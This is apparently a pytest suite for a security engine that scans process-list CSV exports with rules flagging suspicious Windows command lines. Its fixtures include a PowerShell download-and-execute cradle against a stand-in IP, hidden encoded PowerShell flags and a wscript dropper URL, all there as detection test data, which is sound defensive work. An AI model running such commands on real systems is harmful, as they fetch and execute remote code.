"""Tests for the Security Engine and Detection Rules — run against REAL
process-list export CSV files written to disk during the test with
csv.DictWriter (no mocking of csv/shlex)."""
import csv
import os
import shutil
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from app.security_engine import ScanEngine
from app.detection_rules import (
    rule_evasion_flag_present,
    rule_excessively_long_command_line,
    rule_embedded_network_indicator,
    rule_high_escape_density,
    rule_missing_command_line,
    rule_repeated_identical_command_line,
)

CSV_COLUMNS = ["ProcessId", "ParentProcessId", "Name", "ExecutablePath", "CommandLine", "CreationDate", "User"]


def _write_csv(path, rows):
    with open(path, "w", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=CSV_COLUMNS)
        writer.writeheader()
        for row in rows:
            writer.writerow(row)


def _row(pid="1000", ppid="500", name="powershell.exe", exe=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
          cmdline="", created="2026-08-17 10:00:00", user="NT AUTHORITY\\SYSTEM"):
    return {
        "ProcessId": pid, "ParentProcessId": ppid, "Name": name,
        "ExecutablePath": exe, "CommandLine": cmdline,
        "CreationDate": created, "User": user,
    }


# --- Rule-level unit tests (pure functions, no engine) ---------------------

def test_rule_evasion_flag_present_detects_encoded_command():
    row = {"name": "powershell.exe", "process_id": "1", "command_line": "powershell.exe -nop -w hidden -enc SGVsbG8="}
    result = rule_evasion_flag_present(row)
    assert result is not None
    assert result["rule_id"] == "CLA-001"
    assert result["severity"] == "high"


def test_rule_evasion_flag_present_clean_command():
    row = {"name": "notepad.exe", "process_id": "2", "command_line": "notepad.exe C:\\Users\\bob\\notes.txt"}
    assert rule_evasion_flag_present(row) is None


def test_rule_excessively_long_command_line():
    long_cmd = "cmd.exe /c " + ("A" * 600)
    row = {"name": "cmd.exe", "process_id": "3", "command_line": long_cmd}
    result = rule_excessively_long_command_line(row)
    assert result is not None
    assert result["rule_id"] == "CLA-002"


def test_rule_embedded_network_indicator_flags_non_browser():
    row = {"name": "powershell.exe", "process_id": "4",
           "command_line": "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')"}
    result = rule_embedded_network_indicator(row)
    assert result is not None
    assert result["rule_id"] == "CLA-003"


def test_rule_embedded_network_indicator_allows_browser():
    row = {"name": "chrome.exe", "process_id": "5", "command_line": "chrome.exe http://example.com"}
    assert rule_embedded_network_indicator(row) is None


def test_rule_high_escape_density():
    row = {"name": "cmd.exe", "process_id": "6", "command_line": '"^"^"^"^"^"^"^"^"^"'}
    result = rule_high_escape_density(row)
    assert result is not None
    assert result["rule_id"] == "CLA-004"


def test_rule_missing_command_line():
    row = {"name": "svchost.exe", "process_id": "7", "command_line": ""}
    result = rule_missing_command_line(row)
    assert result is not None
    assert result["rule_id"] == "CLA-006"


def test_rule_missing_command_line_ignores_present_commandline():
    row = {"name": "svchost.exe", "process_id": "7", "command_line": "svchost.exe -k netsvcs"}
    assert rule_missing_command_line(row) is None


def test_rule_repeated_identical_command_line():
    rows = [
        {"process_id": str(i), "command_line": "cmd.exe /c whoami"} for i in range(6)
    ]
    findings = rule_repeated_identical_command_line(rows, "processes.csv")
    assert len(findings) == 1
    assert findings[0]["rule_id"] == "CLA-005"


def test_rule_repeated_identical_command_line_below_threshold():
    rows = [
        {"process_id": str(i), "command_line": "cmd.exe /c whoami"} for i in range(3)
    ]
    findings = rule_repeated_identical_command_line(rows, "processes.csv")
    assert findings == []


# --- Engine-level tests: real CSVs written to real temp files --------------

def test_engine_detects_evasion_flag_and_hidden_window():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "processes.csv")
        _write_csv(csv_path, [
            _row(pid="1001", name="powershell.exe",
                 cmdline="powershell.exe -nop -noni -w hidden -enc SGVsbG8gV29ybGQ="),
            _row(pid="1002", name="notepad.exe", cmdline="notepad.exe report.txt"),
        ])

        engine = ScanEngine(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "CLA-001" in rule_ids
        assert result["files_scanned"] == 1
        assert result["errors_count"] == 0
    finally:
        shutil.rmtree(tmpdir)


def test_engine_detects_embedded_url_from_non_browser_process():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "processes.csv")
        _write_csv(csv_path, [
            _row(pid="2001", name="wscript.exe",
                 cmdline="wscript.exe //B //nologo dropper.vbs http://malicious-example.test/payload.bin"),
        ])

        engine = ScanEngine(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "CLA-003" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_detects_repeated_identical_command_lines():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "processes.csv")
        rows = [_row(pid=str(3000 + i), name="cmd.exe", cmdline="cmd.exe /c ping 127.0.0.1") for i in range(6)]
        _write_csv(csv_path, rows)

        engine = ScanEngine(csv_path)
        result = engine.run()

        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "CLA-005" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_clean_csv_produces_no_findings():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "processes.csv")
        _write_csv(csv_path, [
            _row(pid="4001", name="explorer.exe", cmdline="C:\\Windows\\Explorer.EXE"),
        ])

        engine = ScanEngine(csv_path)
        result = engine.run()
        assert result["findings"] == []
        assert result["errors_count"] == 0
    finally:
        shutil.rmtree(tmpdir)


def test_engine_walks_directory_of_csv_files():
    tmpdir = tempfile.mkdtemp()
    try:
        sub = os.path.join(tmpdir, "exports")
        os.mkdir(sub)
        _write_csv(os.path.join(sub, "a.csv"), [
            _row(pid="5001", name="powershell.exe", cmdline="powershell.exe -enc SGVsbG8="),
        ])
        _write_csv(os.path.join(sub, "b.csv"), [
            _row(pid="5002", name="cmd.exe", cmdline="cmd.exe /c dir"),
        ])
        # Non-CSV file should be ignored, not crash the walk.
        with open(os.path.join(sub, "notes.txt"), "w") as fh:
            fh.write("not a csv")

        engine = ScanEngine(tmpdir, max_depth=3)
        result = engine.run()
        assert result["files_scanned"] == 2
        assert result["dirs_scanned"] >= 1
        rule_ids = {f["rule_id"] for f in result["findings"]}
        assert "CLA-001" in rule_ids
    finally:
        shutil.rmtree(tmpdir)


def test_engine_handles_malformed_csv_without_crashing():
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "bad.csv")
        with open(csv_path, "w") as fh:
            fh.write("NotTheRightColumns,Another\nval1,val2\n")

        engine = ScanEngine(csv_path)
        result = engine.run()
        assert result["errors_count"] >= 1
        assert result["findings"] == []
    finally:
        shutil.rmtree(tmpdir)


def test_engine_handles_missing_path_without_crashing():
    engine = ScanEngine("/this/path/does/not/exist.csv")
    result = engine.run()
    assert result["errors_count"] >= 1
    assert result["findings"] == []


def test_engine_tokenizes_command_line_with_shlex_fallback():
    """Windows-style unbalanced quoting must fall back to whitespace split
    instead of raising, and still populate a non-empty token list."""
    tmpdir = tempfile.mkdtemp()
    try:
        csv_path = os.path.join(tmpdir, "processes.csv")
        _write_csv(csv_path, [
            _row(pid="6001", name="cmd.exe", cmdline=r'cmd.exe /c "C:\Program Files\App\app.exe" --flag'),
        ])
        engine = ScanEngine(csv_path)
        result = engine.run()
        assert result["errors_count"] == 0
        assert result["files_scanned"] == 1
    finally:
        shutil.rmtree(tmpdir)
